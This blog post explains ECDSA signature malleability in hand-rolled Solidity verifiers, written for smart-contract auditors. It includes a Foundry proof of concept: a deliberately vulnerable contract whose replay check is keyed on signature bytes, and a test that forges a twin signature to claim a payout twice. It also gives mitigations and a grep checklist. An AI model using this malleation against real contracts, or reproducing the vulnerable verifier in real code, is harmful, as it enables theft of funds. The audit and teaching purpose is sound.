---
layout: post
title: "Signature Malleability in Hand-Rolled ECDSA: Turning One Signed Message Into Two"
date: 2026-05-31 21:55:02 +0000
---

# Signature Malleability in Hand-Rolled ECDSA: Turning One Signed Message Into Two

*By Yael Aronov, Technical Deep-Dive Author — boogiemanmarketing.com*

## The bug class: why hand-rolled ecrecover keeps shipping malleable

Every audit competition surfaces at least one custom signature verifier. Teams reach for `ecrecover` directly the moment they want a meta-transaction relayer, an off-chain order book, a permit-flavored approval, or a bridge anti-replay set. The precompile is one line, it is older than every L2, and it has shipped with a footgun since Frontier: `ecrecover` accepts the upper half of the secp256k1 `s` range, and the EVM does not care that for every valid signature in that range there is a second valid signature for the same digest and the same signer.

The load-bearing mistake is not calling `ecrecover` — the precompile is fine. The mistake is the anti-replay layer built on top of it. The dominant pattern in greenfield code is to hash the signature bytes themselves and gate on a `usedSig[keccak256(sig)]` mapping, because it feels like a content-addressed dedupe and it removes the need to thread a nonce through the user-facing API. It is also exactly wrong: `keccak256(sig)` is not a stable identifier for "this user authorized this action," it is an identifier for "this specific byte string." Two byte strings can authorize the same action. The dedupe key the developer intended was the (signer, digest) pair; what they wrote was a key the attacker controls a second preimage for.

OpenZeppelin's `ECDSA.sol` exists for one reason: to wrap `ecrecover` with the EIP-2 low-`s` check so that for any given digest exactly one signature verifies. If a contract imports it and uses `recover` exclusively, the bug class is closed. If a contract reimplements the precompile call, it is a bug-class candidate until proven otherwise.

## secp256k1 from first principles: why (r, s) and (r, n−s) both verify

ECDSA signatures live on secp256k1, an elliptic curve `y² = x³ + 7` over a prime field. A signature `(r, s)` over a digest `e` and private key `d` is produced by picking a random nonce `k`, computing `R = k·G`, taking `r = R.x mod n`, and `s = k⁻¹·(e + r·d) mod n`. Here `n` is the order of the generator point `G`.

Verification reverses the algebra: given `(r, s)`, the public key `Q`, and digest `e`, the verifier reconstructs `R' = (e·s⁻¹)·G + (r·s⁻¹)·Q` and checks that `R'.x mod n == r`.

The exploitable detail is in that last step. The verifier checks only the x-coordinate of `R'`. It never looks at the y-coordinate. But the curve is symmetric across the x-axis: for any point `P = (x, y)` on the curve, `(x, -y)` is also on the curve. They share an x.

Algebraically, negating `s` in the verification equation flips the y-coordinate of `R'` while leaving the x-coordinate untouched. So `(r, s)` and `(r, n-s)` both verify against the same digest with the same public key. The only on-chain artifact that distinguishes them is the `v` parity bit, which flips correspondingly between 27 and 28.

EIP-2 (Homestead, 2016) made the canonical form explicit at the consensus layer: a transaction signature is valid only if `s ≤ n/2`. This bisection turns the two-signatures-per-digest property into one-signature-per-digest. But the EVM's `ecrecover` precompile predates EIP-2 and was never retrofitted. Application code that calls `ecrecover` directly inherits the pre-EIP-2 behavior. The check is enforced for transaction signatures by node validation, not by the precompile that contracts call.

## The attack: turning one valid signature into two

The exploitable shape requires three ingredients in the same code path:

1. A custom verifier that calls `ecrecover` directly without enforcing `s ≤ n/2`.
2. An anti-replay layer keyed on signature bytes — typically `usedSig[keccak256(sig)]` — rather than on `(signer, digest, nonce)`.
3. Any state mutation that scales with successful verification — payouts, nonce increments, mint quantities, position fills, fee credits.

Given a legitimate signed message `(v, r, s)`, the attacker malleates by:

- Computing `s' = n - s` where `n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141` (the secp256k1 group order).
- Flipping `v` between 27 and 28 (or 0/1 in some encodings).
- Re-encoding as `(r, s', v')`.

The new tuple is a valid signature over the same digest by the same private key. The verifier's `ecrecover` accepts it and returns the same recovered address. The dedupe layer's `keccak256` produces a different slot key because the byte representation differs. The state mutation fires twice on what was authored as one authorization.

Where this turns into money on mainnet:

- **Meta-transaction relayers** — the relayer fee is paid out per `claim()`. Two valid sigs → two fee payouts.
- **Sighash-keyed permits** — custom permit flows that dedupe on signature hash rather than nonce. One off-chain approval becomes two on-chain approvals.
- **RFQ settlement and signed limit orders** — the maker's signed quote can be filled twice. The maker's inventory clears at the same price for double the volume they intended to commit.
- **Bridge anti-replay sets** — the destination chain mints the bridged amount twice for one source-chain lock.
- **Off-chain order books with on-chain settlement** — every signed order has a malleated twin that bypasses the "already filled" check.

The pattern is recurrent because the developer's mental model says "I'm deduping the signed message" but the code says "I'm deduping the bytes of one specific signature." Those are different statements about different objects.

## Foundry PoC

The minimum reproduction is two files. A naive verifier with the load-bearing bug, and a test that drains it through the malleated twin.

```solidity
// src/NaiveVerifier.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract NaiveVerifier {
    // BUG: dedupe keyed on raw sig bytes — a malleated sig hashes to a different slot
    mapping(bytes => bool) public usedSig;
    mapping(address => uint256) public payouts;

    function claim(bytes32 digest, bytes calldata sig) external {
        require(!usedSig[sig], "replay");
        usedSig[sig] = true;
        bytes32 r; bytes32 s; uint8 v;
        assembly {
            r := calldataload(sig.offset)
            s := calldataload(add(sig.offset, 0x20))
            v := byte(0, calldataload(add(sig.offset, 0x40)))
        }
        address signer = ecrecover(digest, v, r, s);
        require(signer != address(0), "bad sig");
        payouts[signer] += 1 ether;
    }
}
```

```solidity
// test/MalleabilityTest.t.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {NaiveVerifier} from "../src/NaiveVerifier.sol";

contract MalleabilityTest is Test {
    NaiveVerifier verifier;
    uint256 constant N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;

    function setUp() public {
        verifier = new NaiveVerifier();
        vm.deal(address(verifier), 2 ether);
    }

    function test_MalleableDoubleSpend() public {
        uint256 pk = 0xA11CE;
        address signer = vm.addr(pk);
        bytes32 digest = keccak256("claim-v1");

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        bytes memory sig1 = abi.encodePacked(r, s, v);
        verifier.claim(digest, sig1);
        assertEq(verifier.payouts(signer), 1 ether);
        assertTrue(verifier.usedSig(sig1));

        // Malleate: (r, N-s, v^1) verifies for the same digest, same signer
        bytes32 sMal = bytes32(N - uint256(s));
        uint8 vMal = v == 27 ? 28 : 27;
        bytes memory sig2 = abi.encodePacked(r, sMal, vMal);

        // Passes the dedupe because keccak256(sig2) != keccak256(sig1) — same intent, different bytes
        verifier.claim(digest, sig2);
        assertEq(verifier.payouts(signer), 2 ether); // DRAINED via twin signature
        assertTrue(verifier.usedSig(sig2));
    }
}
```

Run `forge test --match-test test_MalleableDoubleSpend -vvv` and the assertion at `payouts == 2 ether` passes. One signed authorization, two payouts.

## Mitigations

The fix has multiple correct shapes depending on context.

**Direct OpenZeppelin import (recommended).** Replace any custom verifier with `ECDSA.recover(digest, sig)` from `openzeppelin-contracts/utils/cryptography/ECDSA.sol`. The library enforces `s ≤ n/2` internally and reverts on the upper-half values that constitute the malleated twin. If a code review surfaces a raw `ecrecover` in 2026, the default refactor is to delete it and import OZ. There is no performance argument against this — the inline assembly version saves negligible gas relative to the correctness risk.

**Inline low-s guard.** If an OZ import is not available, the explicit check is one line:

```solidity
require(
    uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0,
    "ECDSA: invalid s value"
);
```

That magic number is `n/2`. Anything strictly above it is the malleated upper half and must be rejected.

**`tryRecover` is not sufficient on its own.** OZ exposes `tryRecover` as the non-reverting variant, returning `(address, RecoverError)`. The malleability check is inside `tryRecover` and it returns `RecoverError.InvalidSignatureS` for upper-half values. So `tryRecover` is safe if and only if the caller checks the error code and rejects on `InvalidSignatureS`. Calling `tryRecover` and acting on just the returned address — pattern `(address signer, ) = ECDSA.tryRecover(...)` — discards the error and reintroduces the bug.

**Re-key the anti-replay map.** Even with low-`s` enforced, the dedupe should be on the intent, not the bytes. The canonical key is `keccak256(abi.encode(signer, digest, nonce))`, or simply `(signer, nonce)` when the nonce monotonically increments. This makes the dedupe robust to future signature-encoding changes (ERC-1271, account abstraction, EIP-7702 variants) and removes the implicit assumption that `keccak256(sig)` is collision-free across all signing surfaces that might write to the map.

**Account abstraction adjacency.** ERC-1271's `isValidSignature` lets smart-contract wallets return a magic value for arbitrary signing logic. Verifiers that gate on `keccak256(sig)` are doubly broken in an AA world because the same wallet may legitimately return valid for multiple signature formats over the same digest by design. Anti-replay must live on intent, not bytes.

## Auditor grep checklist

When reviewing a Solidity codebase for this bug class, the targets in priority order:

1. **`ecrecover(`** — every direct call needs a low-`s` guard or sits behind an OZ wrapper on the same path. Inline `assembly` blocks calling the precompile at address `0x01` carry the same risk in different syntax. Grep both.
2. **`usedSig[keccak256`, `usedSignature[keccak256`, `seenSig[keccak256`** — anti-replay maps keyed on signature hash. Each is a candidate for double-spend if the verifier above it is not malleability-resistant.
3. **`function recover(`, `function verify(`, `function _verify(`** — custom helpers that wrap `ecrecover`. Read each for the s-bound check. If missing, the bug class is open everywhere this helper is called.
4. **`n/2`, `0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0`, `secp256k1n / 2`** — the presence of this constant is a positive signal that the team thought about malleability; absence near a custom recover is the diagnostic.
5. **`tryRecover(`** — verify the caller checks the `RecoverError` enum and rejects `InvalidSignatureS`. The discard pattern `(address signer, ) = ECDSA.tryRecover(...)` is unsafe.
6. **`nonces[`, `noncesUsed[`, `seenHash[`** — read whether the key is `(signer, ...)` or `(sigHash, ...)`. The latter is a candidate.
7. **EIP-712 domain-separator construction** — verify the domain separator is included in the digest. Missing domain separator is a different bug class (cross-contract replay) but lives in the same code paths and is worth catching in the same pass.

When the grep hits, the next step is the §4 PoC adapted to the target's specific signature surface. If `vm.sign` plus thirty lines of Foundry produces a double-spend, the finding is High severity in any Cantina-, Sherlock-, or Code4rena-class competition.

---

*Boogieman Marketing publishes weekly technical retrospectives distilled from live audit competition codebases. For private audit engagements: **info@boogiemanmarketing.com**.*
